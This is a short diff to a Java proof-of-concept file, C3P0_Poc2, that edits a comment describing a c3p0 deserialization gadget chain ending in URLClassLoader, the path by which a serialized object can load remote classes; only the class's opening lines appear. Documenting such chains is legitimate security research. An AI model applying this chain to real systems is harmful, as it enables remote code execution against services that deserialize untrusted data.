@@ -15,12 +15,16 @@ import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
+
 /**
- * <com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase: void readObject(java.io.ObjectInputStream)>
- * -><com.mchange.v2.ser.IndirectlySerialized: java.lang.Object getObject()>
- * -><com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized: java.lang.Object getObject()>
- * -><com.mchange.v2.naming.ReferenceableUtils: java.lang.Object referenceToObject(javax.naming.Reference,javax.naming.Name,javax.naming.Context,java.util.Hashtable)>
+ * gadget chain
+ * readObject:526, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
+ * getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)
+ * referenceToObject:88, ReferenceableUtils (com.mchange.v2.naming)
+ * <init>:100, URLClassLoader (java.net)
  */
+
+
 
 public class C3P0_Poc2 {
     private static final class PoolSource implements DataSource, Referenceable {
